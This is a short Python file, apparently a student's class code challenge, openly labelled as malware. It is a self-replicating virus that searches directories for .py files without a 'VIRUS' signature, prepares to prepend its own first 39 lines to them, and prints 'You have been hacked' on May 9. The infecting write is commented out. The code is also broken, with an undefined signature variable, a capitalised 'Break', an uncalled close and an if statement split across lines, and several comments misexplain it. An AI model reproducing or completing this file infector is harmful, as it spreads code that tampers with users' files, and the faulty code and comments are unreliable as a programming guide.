#!/usr/bin/python3 - It's a python scipt 

# Script: Ops 301 Class 14 Code Challenge
# Joshua Phipps
# 3/30/2023
# Purpose:  Python Malware



import os  #They import the OS library
import datetime #They imported the date and time libary

# SIGNATURE = "VIRUS"  #The signature indicates the names and types of the input arguments, and (with type annotations) the type of the returned result(s) of a function or method.


#Found the file and put the virus in it
def locate(path): #def is the keyword for defining a function.
    files_targeted = []
    filelist = os.listdir(path) #Finding the specific file they want to target
    for fname in filelist: #A for loop is used for iterating over a sequence 
        if os.path.isdir(path+"/"+fname):#If decides whether certain statements need to be executed or not
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":#elif is short for "else if" and is used when the first if statement isn't true, but you want to check for another condition
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line: #called the virus “signature”
                    infected = True #Made it a true statement
                    Break #Stopped the loop
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted #ends the function call and returns the result to the caller


#Opened the virus file
def infect(files_targeted): #telling to infect this specific file
    virus = open(os.path.abspath(__file__)) #put a  virus in this directory
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        # f = open(fname,"w")
        # f.write(virusstring + temp)
        # f.close()


#Executed the date and time virus
def detonate():  #defined detonate
    if datetime.datetime.now().month == 5 and #Made the date and time May 9 in the virus.
datetime.datetime.now().day == 9:

        print("You have been hacked") #The user will read “You have been infected”

files_targeted = locate(os.path.abspath("")) #Find the file “os.path.abspath
infect(files_targeted) #put the virus in that file once found
detonate()  #Execute!